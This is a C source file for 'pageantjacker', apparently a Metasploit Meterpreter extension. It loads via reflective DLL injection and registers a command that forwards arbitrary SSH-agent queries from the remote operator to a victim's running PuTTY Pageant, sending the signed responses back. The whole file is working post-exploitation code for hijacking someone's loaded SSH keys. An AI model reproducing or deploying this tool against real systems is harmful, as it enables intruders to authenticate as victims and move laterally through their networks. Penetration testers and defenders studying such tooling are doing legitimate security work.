/*!
 * @file pageantjacker.c
 * @brief Entry point and intialisation functionality for the pageantjacker extention.
 */
#include "../../common/common.h"
#include "pageantjacker.h"

#include "../../DelayLoadMetSrv/DelayLoadMetSrv.h"
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

Command customCommands[] =
{
	COMMAND_REQ("pageant_send_query", request_pageant_send_query),
	COMMAND_TERMINATOR
};

DWORD request_pageant_send_query(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	DWORD raw_data_size_in;
	Byte *raw_data_in;
	PAGEANTQUERYRESULTS results = { 0 };

	// Retrieve from metasploit
	raw_data_size_in = packet_get_tlv_value_uint(packet, TLV_TYPE_EXTENSION_PAGEANTJACKER_SIZE_IN);
	raw_data_in = packet_get_tlv_value_raw(packet, TLV_TYPE_EXTENSION_PAGEANTJACKER_BLOB_IN);
	
	dprintf("[PJ(request_pageant_send_query)] Size in: %d. Data is at 0x%p", raw_data_size_in, raw_data_in);

	// Interact with Pageant. Note that this will always return a struct, even if the operation failed.
	if (raw_data_size_in) {
		dprintf("[PJ(request_pageant_send_query)] Forwarding query to Pageant");
		results = send_query_to_pageant(raw_data_in, raw_data_size_in);
	} else {
		results.result = TRUE;
		results.error_message = PAGEANTJACKER_ERROR_NOTFORWARDED;
		results.bloblength = 9;
		results.blob = malloc(results.bloblength);
		memcpy(results.blob, "\x00\x00\x00\x01\x05\x00\x00\x00\x00", results.bloblength);
		dprintf("[PJ(request_pageant_send_query)] Not forwarding query to Pageant");
	}

	// Build the packet based on the respones from the Pageant interaction.
	packet_add_tlv_bool(response, TLV_TYPE_EXTENSION_PAGEANTJACKER_STATUS, results.result);
	packet_add_tlv_raw(response, TLV_TYPE_EXTENSION_PAGEANTJACKER_RETURNEDBLOB, results.blob, results.bloblength);
	packet_add_tlv_string(response, TLV_TYPE_EXTENSION_PAGEANTJACKER_ERRORMESSAGE, results.error_message);	
	dprintf("[PJ(request_pageant_send_query)] Success: %d. Return data len %d, data is at 0x%p. Error message at 0x%p (%s)", results.result, results.bloblength, results.blob, &results.error_message, results.error_message);

	// Free the allocated memory once we are done
	if (results.blob) {
		free(results.blob);
		dprintf("[PJ(request_pageant_send_query)] Freed results blob");
	}

	// Transmit the packet to metasploit
	packet_transmit_response(ERROR_SUCCESS, remote, response);

	return ERROR_SUCCESS;
}


/*!
 * @brief Initialize the server extension
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	hMetSrv = remote->met_srv;

	command_register_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	command_deregister_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
* @brief Get the name of the extension.
* @param buffer Pointer to the buffer to write the name to.
* @param bufferSize Size of the \c buffer parameter.
* @return Indication of success or failure.
*/
DWORD __declspec(dllexport) GetExtensionName(char* buffer, int bufferSize)
{
	strncpy_s(buffer, bufferSize, "pageantjacker", bufferSize - 1);
	return ERROR_SUCCESS;
}

PAGEANTQUERYRESULTS send_query_to_pageant(byte *query, unsigned int querylength) {

	char strPuttyRequest[23]; // This will always be 23 chars
	COPYDATASTRUCT pageant_copy_data;
	unsigned char *filemap_pointer;
	HANDLE filemap;
	PAGEANTQUERYRESULTS ret;
	HWND hPageant;
	unsigned int protocol_return_length;
	unsigned int api_result;
	void *memcpy_result;

	// Initialise the results arrays
	memset((void *) &ret, 0, sizeof(ret));
	memset((void *) &strPuttyRequest, 0, sizeof(strPuttyRequest));
	ret.result = FALSE;
	ret.error_message = PAGEANTJACKER_ERROR_NOERROR;

	if (hPageant = FindWindowW(PAGEANT_NAME, PAGEANT_NAME)) {

		dprintf("[PJ(send_query_to_pageant)] Pageant Handle is %x",hPageant);

		// Generate the request string and populate the struct
		if (_snprintf_s((char *)&strPuttyRequest, sizeof(strPuttyRequest), _TRUNCATE, "PageantRequest%08x", (unsigned int)GetCurrentThreadId())) { 
			pageant_copy_data.dwData = AGENT_COPYDATA_ID;
			pageant_copy_data.cbData = sizeof(strPuttyRequest);
			pageant_copy_data.lpData = &strPuttyRequest;
			dprintf("[PJ(send_query_to_pageant)] Request string is at 0x%p (%s)", &pageant_copy_data.lpData, pageant_copy_data.lpData);

			// Pageant effectively communicates with PuTTY using shared memory (in this case, a pagefile backed memory allocation).
			// It will overwrite this memory block with the result of the query.
			filemap = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, AGENT_MAX, (char *) &strPuttyRequest);
			if (filemap && filemap != INVALID_HANDLE_VALUE) {
				dprintf("[PJ(send_query_to_pageant)] CreateFileMappingA returned 0x%x", filemap);
				if (filemap_pointer = MapViewOfFile(filemap, FILE_MAP_WRITE, 0, 0, 0)) {
					dprintf("[PJ(send_query_to_pageant)] MapViewOfFile returned 0x%x", filemap_pointer);

					// Initialise and copy the request to the memory block that will be passed to Pageant.
					memset((void *) filemap_pointer, 0, AGENT_MAX);
					if (querylength)
						memcpy(filemap_pointer, query, querylength);

					dprintf("[PJ(send_query_to_pageant)] Request length: %d. Query buffer preview: %02X:%02X:%02X:%02X:%02X:%02X:%02X:%02X. Request buffer preview: %02X:%02X:%02X:%02X:%02X:%02X:%02X:%02X", querylength, query[0], query[1], query[2], query[3], query[4], query[5], query[6], query[7], filemap_pointer[0], filemap_pointer[1], filemap_pointer[2], filemap_pointer[3], filemap_pointer[4], filemap_pointer[5], filemap_pointer[6], filemap_pointer[7]);
					
					// Send the request message to Pageant.
					dprintf("[PJ(send_query_to_pageant)] Ready to send WM_COPYDATA");
					if (SendMessage(hPageant, WM_COPYDATA, (WPARAM) NULL, (LPARAM) &pageant_copy_data)) {

						protocol_return_length = get_length_response(filemap_pointer)+4;
						dprintf("[PJ(send_query_to_pageant)] Result length: %d. Result buffer preview: %02X:%02X:%02X:%02X:%02X:%02X:%02X:%02X", protocol_return_length, filemap_pointer[0], filemap_pointer[1], filemap_pointer[2], filemap_pointer[3], filemap_pointer[4], filemap_pointer[5], filemap_pointer[6], filemap_pointer[7]);
						if (protocol_return_length && protocol_return_length<AGENT_MAX) {
							if (ret.blob = calloc(1, protocol_return_length)) {
								memcpy_result = memcpy(ret.blob, filemap_pointer, protocol_return_length);
								ret.bloblength = protocol_return_length;
								ret.result = TRUE;
								dprintf("[PJ(send_query_to_pageant)] Set Result to TRUE, copied memory to ret.blob (result: 0x%x)",memcpy_result);
							} else {
								dprintf("[PJ(send_query_to_pageant)] Malloc error (length: %d).", protocol_return_length);
								ret.error_message = PAGEANTJACKER_ERROR_ALLOC;
							}
						}
					 } else {
						// SendMessage failed
						ret.error_message = PAGEANTJACKER_ERROR_SENDMESSAGE;
					 }
					 api_result = UnmapViewOfFile(filemap_pointer);
					 dprintf("[PJ(send_query_to_pageant)] UnmapViewOfFile returns %d.", api_result);
				} else {
					// MapViewOfFile failed
					ret.error_message = PAGEANTJACKER_ERROR_MAPVIEWOFFILE;
				}
				api_result = CloseHandle(filemap);
				dprintf("[PJ(send_query_to_pageant)] CloseHandle (from CreateFileMapping) returns %d.", api_result);
			} else {
				// CreateFileMapping failed
				ret.error_message = PAGEANTJACKER_ERROR_CREATEFILEMAPPING;
			}
		} else {
			// _snprintf_s failed. Note that this should never happen because it could
			// mean that somehow %08x has lost its meaning. Essentially though this is
			// here to guard against buffer overflows.
			ret.error_message = PAGEANTJACKER_ERROR_REQSTRINGBUILD;
		}

	} else {
		// Could not get a handle to Pageant. This probably means that it is not running.
		ret.error_message = PAGEANTJACKER_ERROR_NOTFOUND;
	}
	return ret;
}

DWORD get_length_response(byte *b) {
	return (b[3]) | (b[2] << 8) | (b[1] << 16) | (b[0] << 24);
}